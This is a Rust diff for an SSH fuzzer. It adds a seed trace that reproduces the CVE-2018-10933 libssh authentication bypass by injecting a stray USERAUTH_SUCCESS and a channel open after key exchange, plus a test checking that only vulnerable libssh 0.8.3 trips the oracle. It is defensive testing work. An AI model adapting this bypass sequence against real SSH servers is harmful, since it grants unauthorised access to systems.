@@ -305,6 +305,77 @@ pub fn seed_client_attacker_full_aesgcm(server: AgentName) -> Trace<SshProtocolT
     }
 }
 
+// ── Seed: CVE-2018-10933 authentication bypass (client attacker) ──────────────
+//
+// The fuzzer (client) completes the KEX, then — instead of authenticating —
+// injects an SSH_MSG_USERAUTH_SUCCESS (a message a server should never accept)
+// followed by a channel open. A libssh server vulnerable to CVE-2018-10933
+// wrongly transitions to the authenticated state on the stray USERAUTH_SUCCESS
+// and then accepts the channel open; the harness records a completed handshake
+// with NO authentication method, which the entity-authentication oracle flags.
+// A patched server ignores/rejects the stray message and never completes.
+pub fn seed_client_attacker_auth_bypass(server: AgentName) -> Trace<SshProtocolTypes> {
+    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
+    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };
+    let server_kexinit = term! { (server, 0)[None]/SshMessage };
+    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
+    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
+    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
+    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
+    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
+    let our_kexinit = term! {
+        fn_kex_init(
+            (fn_placeholder_16bytes),
+            ((server, 0)[None]/KexAlgorithms),
+            ((server, 0)[None]/SignatureSchemes),
+            ((server, 0)[None]/EncryptionAlgorithms),
+            ((server, 1)[None]/EncryptionAlgorithms),
+            ((server, 0)[None]/MacAlgorithms),
+            ((server, 1)[None]/MacAlgorithms),
+            ((server, 0)[None]/CompressionAlgorithms),
+            ((server, 1)[None]/CompressionAlgorithms)
+        )
+    };
+    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
+    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
+    let exch_hash = term! {
+        fn_kex_exchange_hash(
+            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
+            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
+        )
+    };
+    let enc_key = term! { fn_derive_enc_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
+
+    // The bypass: inject USERAUTH_SUCCESS (seqno 3), then a channel open (4).
+    let bypass = term! {
+        fn_encrypt_packet((fn_user_auth_success), (@enc_key), (fn_u32_3))
+    };
+    let chan_open = term! {
+        fn_encrypt_packet(
+            (fn_channel_open((fn_channel_session), (fn_u32_0), (fn_u32_1), (fn_u32_2),
+                             (fn_empty_bytes_vec))),
+            (@enc_key), (fn_u32_4))
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            server,
+            SshDescriptorConfig { typ: AgentType::Server, try_reuse: false },
+        )],
+        steps: vec![
+            OutputAction::new_step(server),
+            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
+            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
+            InputAction::new_step(server, term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) }),
+            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
+            InputAction::new_step(server, term! { @bypass }),
+            InputAction::new_step(server, term! { @chan_open }),
+        ],
+        ..Default::default()
+    }
+}
+
 // ── Seed: client attacker, PUBLIC KEY auth over AES-256-GCM (both vendors) ────
 //
 // Like seed_client_attacker_pubkey but over the AES-GCM record layer, so it
@@ -789,6 +860,41 @@ mod tests {
         );
     }
 
+    /// CVE-2018-10933 positive demonstration: the auth-bypass seed must trip the
+    /// entity-authentication oracle on vulnerable libssh 0.8.3, and must NOT on
+    /// the patched 0.10.4 / 0.11.4 — the property (not a coded mechanism)
+    /// distinguishes them.
+    #[test_log::test]
+    fn test_cve_2018_10933_auth_bypass_differential() {
+        use puffin::put::{PutDescriptor, PutOptions};
+
+        use crate::ssh::seeds::seed_client_attacker_auth_bypass;
+
+        let registry = ssh_registry();
+        let server = puffin::agent::AgentName::first();
+        let puts: Vec<String> = registry.puts().map(|(n, _)| n.to_owned()).collect();
+
+        let mut saw_vulnerable = false;
+        for put in puts {
+            if !put.starts_with("libssh") {
+                continue;
+            }
+            let spawner = Spawner::new(registry.clone())
+                .with_mapping(&[(server, PutDescriptor::new(put.clone(), PutOptions::default()))]);
+            let runner = Runner::new(registry.clone(), spawner);
+            let result = runner.execute(seed_client_attacker_auth_bypass(server), &mut 0);
+            let fired = matches!(&result, Err(e) if format!("{e}").contains("authentication bypass"));
+
+            if put.contains("0803") {
+                assert!(fired, "{put} (vulnerable) should trip the auth-bypass oracle");
+                saw_vulnerable = true;
+            } else {
+                assert!(!fired, "{put} (patched) must NOT report an auth bypass");
+            }
+        }
+        assert!(saw_vulnerable, "vulnerable libssh0803 PUT not present — build it first");
+    }
+
     /// Trace-analysis matching conversation: recover, by re-evaluating the
     /// trace's input recipes, what each honest party received on the wire — and
     /// show that dropping a relayed message (the Terrapin truncation primitive)
@@ -850,9 +956,13 @@ mod tests {
         let registry = ssh_registry();
         let server = puffin::agent::AgentName::first();
 
-        // Run on every PUT that completes the AES-GCM handshake (libssh + wolfSSH).
+        // Run on every PUT that completes the AES-GCM handshake (modern libssh +
+        // wolfSSH). libssh 0.8.x predates aes256-gcm@openssh.com, so skip it.
         let puts: Vec<String> = registry.puts().map(|(n, _)| n.to_owned()).collect();
         for put in puts {
+            if put.contains("0803") {
+                continue;
+            }
             let spawner = Spawner::new(registry.clone())
                 .with_mapping(&[(server, PutDescriptor::new(put.clone(), PutOptions::default()))]);
             let runner = Runner::new(registry.clone(), spawner);
